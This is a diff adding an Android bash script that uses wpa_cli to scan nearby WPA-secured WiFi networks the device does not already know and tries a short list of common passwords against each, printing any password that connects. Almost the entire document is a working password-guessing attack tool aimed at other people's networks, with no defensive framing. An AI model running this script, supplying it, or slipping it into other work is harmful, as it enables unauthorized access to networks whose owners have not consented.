@@ -1,0 +1,147 @@
+#!/system/bin/env bash
+# wifi-pw-brutforce - Searches for a WiFi that uses a frequently used password.
+
+pw_list="88888888 12345678 1234567890"
+
+DEBUG=1
+
+function debug() {
+	if [ "$DEBUG" == "1" ]; then
+		echo "$@"
+	fi
+}
+function error() {
+	echo "$@"
+	exit 1
+}
+
+# Returns $1 \ $2. Expected to be \n separated strings.
+function set_diff() {
+	# Removes duplicates in $1 and $2.
+	a=$(echo "$1" | sort | uniq)
+	b=$(echo "$2" | sort | uniq)
+
+	nand=$(echo "$a\n$b" | sort | uniq -u)
+	echo "$a\n$nand" | sort | uniq -d | uniq
+}
+
+function wpa_cli() {
+	/system/bin/wpa_cli -iwlan0 IFNAME=wlan0 "$@"
+}
+
+function wpa_cli_ok() {
+	status=$(wpa_cli "$@")
+	if [ "$status" != "OK" ]; then
+		debug "wpa_cli $@: $status."
+		return 1
+	fi
+}
+
+
+# Gets the already known SSIDs.
+known_ssids=$(wpa_cli list_networks | cut -f 2 | tail -n +2)
+
+# Gets the available SSIDs of WPA secured networks.
+wpa_cli_ok scan || error "Could not scan the WiFi networks."
+available_ssids=$(wpa_cli scan_result | grep "WPA" | cut -f 5 | tail -n +2)
+
+# Gets the unknown SSIDs.
+ssids=$(set_diff "$available_ssids" "$known_ssids")
+
+for pw in $pw_list; do
+	echo "Trying password $pw."
+
+	# Runs through the SSIDs.
+	while read -r ssid; do
+		echo "    $ssid..."
+
+		nid=$(wpa_cli add_network)
+		if [[ ! $nid =~ ^[0-9]+$ ]]; then
+			error "Could not add the network."
+		fi
+		
+		function remove_network() {
+			wpa_cli_ok remove_network $nid || error "Could not remove the network."
+		}
+
+		wpa_cli_ok set_network $nid ssid \""$ssid"\" || {
+			echo "Failed to set the network SSID."
+			remove_network
+			continue
+		}
+
+		wpa_cli_ok set_network $nid psk \""$pw"\" || {
+			echo "Failed to set the network password."
+			continue
+		}
+
+		wpa_cli_ok select_network $nid || {
+			echo "Failed to select the network."
+			continue
+		}
+
+		found_password=0
+
+		last_status=""
+		num_same_status=0
+		num_4way_handshake=0
+		while true; do
+			status=$(wpa_cli status | grep wpa_state | sed "s/wpa_state=//")
+			debug "STATUS=$status"
+			
+			if [ "$last_status" == "$status" ]; then
+				num_same_status=$(($num_same_status + 1))
+				if [ "$num_same_status" == "5" ]; then
+					# The same status for 5s -> abort.
+					break;
+				fi
+			else
+				num_same_status=0
+			fi
+			last_status="$status"
+
+			case $status in
+			"")
+				echo "Failed to get the network status."
+				break
+				;;
+			COMPLETED)
+				# We found a valid password!
+				echo "    Found Valid password! $pw"
+				found_password=1
+				break
+				;;
+			DISCONNECTED|SCANNING)
+				# Wrong password.
+				break
+				;;
+			4WAY_HANDSHAKE)
+				num_4way_handshake=$(($num_4way_handshake + 1))
+				if [ "$num_4way_handshake" == "2" ]; then
+					# We only give authentication 2s time.
+					# This is now over and we assume wrong password.
+					break
+				fi
+
+				# Needs more time...
+				sleep 1s
+				;;
+			*)
+				# Needs more time...
+				sleep 1s
+				;;
+			esac
+		done
+
+		if [ "$found_password" == "0" ]; then
+			remove_network
+			if [ "$DEBUG" != "1" ]; then
+				# Overwrites the current SSID by cleaning the last line.
+				tput cuu1
+				tput el
+			fi
+		fi
+	done
+
+	debug ""
+done <<< "$ssids"
